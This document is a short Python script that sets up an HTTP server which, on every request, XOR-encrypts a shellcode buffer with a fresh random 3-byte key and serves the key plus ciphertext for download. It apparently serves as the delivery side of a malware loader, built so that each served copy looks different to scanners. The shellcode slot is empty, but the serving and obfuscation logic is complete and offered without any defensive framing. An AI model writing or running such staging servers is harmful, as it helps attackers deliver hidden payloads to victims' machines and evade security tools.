from http.server import BaseHTTPRequestHandler, HTTPServer
import os
from itertools import cycle

# Shellcode
SHELLCODE = b""

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def generate_key(self, length=3):
    
        return os.urandom(length)

    def encrypt_payload(self, payload, key):
    
        return bytearray(a ^ b for a, b in zip(payload, cycle(key)))

    def do_GET(self):
        
        # Generate a random key
        key = self.generate_key()
        encrypted_payload = self.encrypt_payload(SHELLCODE, key)

        # Combine key and encrypted payload
        response = key + encrypted_payload
        print(len(response))
        print("Payload (Bytes):", "".join(f"{b:02x}" for b in encrypted_payload))
        # Send response headers
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(response)))
        self.end_headers()

        # Write the combined key + encrypted payload
        self.wfile.write(response)

        print(f"Served encrypted payload with key: {key.hex()}")
        print("=============================================================")
        

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8080):
    """Run the HTTP server."""
    server_address = ("", port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting HTTP server on port {port}...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
